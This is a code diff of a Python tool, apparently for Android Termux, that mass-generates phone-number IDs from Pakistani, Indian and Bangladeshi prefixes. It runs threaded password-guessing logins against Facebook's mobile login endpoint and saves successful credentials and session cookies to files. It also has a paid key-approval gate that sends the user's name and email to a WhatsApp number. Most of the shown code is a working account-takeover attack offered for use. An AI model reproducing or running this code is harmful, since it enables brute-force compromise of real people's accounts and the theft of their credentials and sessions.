-            for Eman in HamiiID:
-                pwx.append(Eman)
-                pwx.append(love)
-            manshera.submit(rcrack,uid,pwx,tl)
-    print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-    print('\x1b[1;94mCrack process has been completed')
-    print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
-    print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system("clear")
+	print(logo)
+	jalan("     \33[37;41m\t  USE OUR COUNTRY CODE  \33[0;m")
+	print('')
+	jalan('\x1b[1;94m  PAK  CODES  :  \x1b[1;94m92301, \x1b[1;94m92302 ,\x1b[1;94m92303 ,\x1b[1;94m92305  ...\033[0;97m')
+	jalan('\x1b[1;97m ══════════════════════════════════════════════════════════')
+	jalan('\x1b[1;91m  INDIA CODES :  \x1b[1;91m91778, \x1b[1;91m91930 ,\x1b[1;91m91902 ,\x1b[1;91m91712  ...\033[0;97m')
+	jalan('\x1b[1;97m ══════════════════════════════════════════════════════════')
+	jalan('\x1b[1;92m  BD CODES    :  \x1b[1;92m88016, \x1b[1;92m88017 ,\x1b[1;92m88018 ,\x1b[1;92m88019  ...\033[0;97m')
+	jalan('\x1b[1;97m ══════════════════════════════════════════════════════════\n')
+	code = input(' PUT CODE : ')
+	os.system('clear')
+	print(logo)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		clear()
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		for noob in user:
+			pwx = [noob[1:]]
+			uid = code+noob
+			for pro in RdxID:
+				pwx.append(pro)
+				pwx.append(noob)
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 
-def rcrack(uid,pwx,tl):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
+	try:
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
     "method": 'GET',
     "scheme": 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -11265,29 +11653,156 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': pro}
-            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                cek_apk(session,coki)
-                open('/sdcard/ⓇDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                #print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/ⓇDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(cid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
-        sys.stdout.flush()
-    except:
-        pass
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/RDX/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/RDX/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
+
+ah="RDX-"
+imt="-APP=="
+ak=" CODE-"
+myid=uuid.uuid4().hex[:10].upper()
+try:
+	key1 = open('/data/data/com.termux/files/usr/bin/.rdx -cov', 'r').read()
+except:
+	kok=open('/data/data/com.termux/files/usr/bin/.rdx -cov', 'w')
+	kok.write(myid+imt)
+	kok.close()
+
+def Subscraption():
+	os.system('clear')
+	print(logo)
+	print('		\033[1;92m  Rdx ')
+	jalan('		\033[1;92mWelcome  ')
+	key1=open('/data/data/com.termux/files/usr/bin/.rdx -cov', 'r').read()
+	jalan("Your Key :- "+ak+ah+key1 )
+	key1=input('\x1b[1;92mType The Approved key Here :- ')
+	os.system('clear')
+	print(logo)
+	r1=requests.get("https://github.com/Rdx-76/Prof/blob/main/r.txt").text
+	if key1 in r1:
+		os.system('clear')
+		print(logo)
+		login()
+	else:
+		os.system("clear")
+		print(logo)
+		jalan("\t \033[1;32m First Get Approval\033[1;37m ")
+		time.sleep(1)
+		os.system("clear")
+		print(logo) 
+		print ("")
+		print(" \033[1;32mThis Tools Are Not Free So You Need To Get Approval First\033[1;37m\n")
+		print(" \033[1;32m Note : First Get Approval Then Enjoy\033[1;37m")
+		print ("")
+		print(" \x1b[1;91mYour Key is Not Approved ")
+		print("")
+		print(" Copy And Send The Key To Admin")
+		print ("")
+		print (" Your Key : " +ak+ah+key1 )
+		print ("")
+		name = input(" Your Name : ")
+		print ("")
+		gf = input(" Your gf Name : ")
+		print ("")
+		lol = input(" Your Your Email : ")
+		print ("")
+		input(" Press Enter To Send Key")
+		time.sleep(3.5)
+		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
+		os.system('am start https://wa.me/+923344706269?text=' + tks)
+		Subscraption()        
+
+def genpassx():
+	os.system("clear")
+	print(logo)
+	print("\033[1;92m\n \033[1;92m[*]\033[1;96m Password generator launching...")
+	sleep(0.7)
+	MAX_LEN = int(input(' \033[1;92m[?]\033[1;96m Password length: '))
+	cot = int(input(' \033[1;92m[?]\033[1;96m Password count: '))
+
+	print('\033[1;92m\n \033[1;92m[*]\033[1;92mPassword length ' + str(MAX_LEN) + ' Selected')
+	print('\033[1;92m \033[1;92m[*]\033[1;92m ' + str(cot) + ' Password will generate.')
+
+	print('\033[1;92m\n \033[1;92m[*]\033[1;96mGenerating.....\n')
+	sleep(1.3)
+	print('\033[1;92m\n \033[1;92m[*]\033[1;92mFollowing are the generated password.\n')
+
+	sleep(1)
+
+	for i in range(cot):
+        
+		DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
+		LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
+		UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+		SYMBOLS = ['@', '#', '$', '%', '=', ':', '?', '.', '/', '|', '~', '>', '*', '(', ')', '<']
+        
+		COMBINED_LIST = DIGITS + UPCASE_CHARACTERS + LOCASE_CHARACTERS + SYMBOLS
+		rand_digit = random.choice(DIGITS)
+		rand_upper = random.choice(UPCASE_CHARACTERS)
+		rand_lower = random.choice(LOCASE_CHARACTERS)
+		rand_symbol = random.choice(SYMBOLS)
+		temp_pass = rand_digit + rand_upper + rand_lower + rand_symbol
+        
+		for x in range(MAX_LEN - 4):
+			temp_pass = temp_pass + random.choice(COMBINED_LIST)
+			temp_pass_list = array.array('u', temp_pass)
+			random.shuffle(temp_pass_list)
+		password = ""
+        
+		for x in temp_pass_list:
+			password = password + x
+		print('\033[1;92m>[‎‎ⓇDX-Generated :- ]> \033[1;92m', password)
+		sleep(0.1)
+    
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+def details():
+	os.system('clear')
+	print(logo4)
+	print("\x1b[1;97m==>\x1b[1;96m[1]\x1b[1;92m  Clone 26 Country Facebook Id ")
+	print("\x1b[1;97m==>\x1b[1;96m[2]\x1b[1;93m  Generate Strong Passwords Automatically For Your Own Account ")
+	print("\x1b[1;97m==>\x1b[1;96m[3]\x1b[1;92m  Clone Old Facebook Id ")
+	print('')
+	print('')
+	print('\x1b[1;96mIf You Want To Get These.Things You Must Pay')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		Primex()
+	elif now=='0':
+		exit()
 
 Primex()
